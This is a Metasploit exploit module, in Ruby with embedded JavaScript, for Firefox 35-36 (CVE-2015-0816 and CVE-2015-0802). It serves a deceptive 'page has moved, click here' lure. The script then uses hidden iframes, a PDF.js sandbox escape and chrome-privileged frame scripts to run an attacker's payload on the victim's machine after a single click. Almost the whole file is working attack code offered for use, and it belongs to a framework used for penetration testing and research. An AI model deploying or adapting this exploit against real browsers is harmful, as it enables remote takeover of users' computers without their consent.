##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Firefox PDF.js Privileged Javascript Injection',
      'Description' => %q{
        This module gains remote code execution on Firefox 35-36 by abusing a
        privilege escalation bug in resource:// URIs. PDF.js is used to exploit
        the bug. This exploit requires the user to click anywhere on the page to
        trigger the vulnerability.
      },
      'Author'         => [
        'Unknown', # PDF.js injection code was taken from a 0day
        'Marius Mlynski', # discovery and pwn2own exploit
        'joev'     # copypasta monkey, CVE-2015-0802
      ],
      'DisclosureDate' => "Mar 31 2015",
      'License'     => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2015-0816'], # pdf.js can load chrome://
          ['CVE', '2015-0802']  # can access messageManager property in chrome window
        ],
      'Targets' => [
        [
          'Universal (Javascript XPCOM Shell)', {
            'Platform' => 'firefox',
            'Arch' => ARCH_FIREFOX
          }
        ],
        [
          'Native Payload', {
            'Platform' => %w{ java linux osx solaris win },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'DefaultTarget' => 0,
      'BrowserRequirements' => {
        :source  => 'script',
        :ua_name => HttpClients::FF,
        :ua_ver  => lambda { |ver| ver.to_i.between?(35, 36) }
      }
    ))

    register_options([
      OptString.new('CONTENT', [ false, "Content to display inside the HTML <body>." ])
    ], self.class)
  end

  def on_request_exploit(cli, request, target_info)
    print_status('Sending exploit...')
    send_response_html(cli, html)
  end

  def html
    "<!doctype html><html><body>#{datastore['CONTENT'] || default_html}"+
    "<script>#{js}</script></body></html>"
  end

  def default_html
    "The page has moved. <span style='text-decoration:underline;'>Click here</span> to be redirected."
  end

  def js
    key = Rex::Text.rand_text_alpha(5 + rand(12))
    frame = Rex::Text.rand_text_alpha(5 + rand(12))
    r = Rex::Text.rand_text_alpha(5 + rand(12))
    opts = { key => run_payload } # defined in FirefoxPrivilegeEscalation mixin

    <<-EOJS
function xml2string(obj) {
  return new XMLSerializer().serializeToString(obj);
}

function __proto(obj) {
  return obj.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__;
}

function get(path, callback, timeout, template, value) {
  callback = _(callback);
  if (template && value) {
    callback = callback.replace(template, value);
  }
  js_call1 = 'javascript:' + _(function() {
    try {
      done = false;
      window.onclick = function() {
        if (done) { return; } done = true;
        q = open("%url%", "q", "chrome,,top=-9999px,left=-9999px,height=1px,width=1px");
        setTimeout(function(){
          q.location='data:text/html,<iframe mozbrowser src="about:blank"></iframe>';

            setTimeout(function(){
              var opts = #{JSON.unparse(opts)};
              var key = opts['#{key}'];
              q.messageManager.loadFrameScript('data:,'+key, false);
              setTimeout(function(){
                q.close();
              }, 100)
            }, 100)
        }, 100);
      }
    } catch (e) {
      history.back();
    }
    undefined;
  }, "%url%", path);
  js_call2 = 'javascript:;try{updateHidden();}catch(e){};' + callback + ';undefined';
  sandboxContext(_(function() {
    p = __proto(i.contentDocument.styleSheets[0].ownerNode);
    l = p.__lookupSetter__.call(i2.contentWindow, 'location');
    l.call(i2.contentWindow, window.wrappedJSObject.js_call1);
  }));
  setTimeout((function() {
    sandboxContext(_(function() {
      p = __proto(i.contentDocument.styleSheets[0].ownerNode);
      l = p.__lookupSetter__.call(i2.contentWindow, 'location');
      l.call(i2.contentWindow, window.wrappedJSObject.js_call2);
    }));
  }), timeout);
}

function get_data(obj) {
  data = null;
  try {
    data = obj.document.documentElement.innerHTML;
    if (data.indexOf('dirListing') < 0) {
      throw new Error();
    }
  } catch (e) {
    if (this.document instanceof XMLDocument) {
        data = xml2string(this.document);
    } else {
      try {
          if (this.document.body.firstChild.nodeName.toUpperCase() == 'PRE') {
              data = this.document.body.firstChild.textContent;
          } else {
              throw new Error();
          }
      } catch (e) {
        try {
          if (this.document.body.baseURI.indexOf('pdf.js') >= 0 || data.indexOf('aboutNetError') > -1) {;
              return null;
          } else {
              throw new Error();
          }
        } catch (e) {
          ;;
        }
      }
    }
  }
  return data;
}

function _(s, template, value) {
  s = s.toString().split(/^\\s*function\\s+\\(\\s*\\)\\s*\\{/)[1];
  s = s.substring(0, s.length - 1);
  if (template && value) {
    s = s.replace(template, value);
  }
  s += __proto;
  s += xml2string;
  s += get_data;
  s = s.replace(/\\s\\/\\/.*\\n/g, "");
  s = s + ";undefined";
  return s;
}

function get_sandbox_context() {
  if (window.my_win_id == null) {
    for (var i = 0; i < 20; i++) {
      try {
        if (window[i].location.toString().indexOf("view-source:") != -1) {
          my_win_id = i;
          break;
        }
      } catch (e) {}
    }
  };
  if (window.my_win_id == null)
    return;
  clearInterval(sandbox_context_i);
  object.data = 'view-source:' + blobURL;
  window[my_win_id].location = 'data:application/x-moz-playpreview-pdfjs;,';
  object.data = 'data:text/html,<'+'html/>';
  window[my_win_id].frameElement.insertAdjacentHTML('beforebegin', '<iframe style='+
    '"position:absolute; left:-9999px;" onload = "'+_(function(){
    window.wrappedJSObject.sandboxContext=(function(cmd) {
      with(importFunction.constructor('return this')()) {
        return eval(cmd);
      }
    });
  }) + '"/>');
}

var HIDDEN = 'position:absolute;left:-9999px;height:1px;width:1px;';
var i = document.createElement("iframe");
i.id = "i";
i.style=HIDDEN;
i.src = "data:application/xml,<?xml version=\\"1.0\\"?><e><e1></e1></e>";
document.documentElement.appendChild(i);
i.onload = function() {
  if (this.contentDocument.styleSheets.length > 0) {
    var i2 = document.createElement("iframe");
    i2.id = "i2";
    i2.style='opacity: 0;position:absolute;top:0;left:0;right:0;bottom:0;';
    i2.height = window.innerHeight+'px';
    i2.width = window.innerWidth+'px';
    i2.src = "data:application/pdf,";
    document.documentElement.appendChild(i2);
    pdfBlob = new Blob([''], {
        type: 'application/pdf'
    });
    blobURL = URL.createObjectURL(pdfBlob);
    object = document.createElement('object');
    object.style=HIDDEN;
    object.data = 'data:application/pdf,';
    object.onload = (function() {
        sandbox_context_i = setInterval(get_sandbox_context, 200);
        object.onload = null;
        object.data = 'view-source:' + location.href;
        return;
    });
    document.documentElement.appendChild(object);
  } else {
    this.contentWindow.location.reload();
  }
}

document.body.style.height = window.innerHeight+'px';

var kill = setInterval(function() {
  if (window.sandboxContext) {
    var f = "chrome://browser/content/browser.xul";
    get(f, function() {}, 0, "%URL%", f);
    clearInterval(kill);
  } else {
    return;
  }
},20);

EOJS
  end
end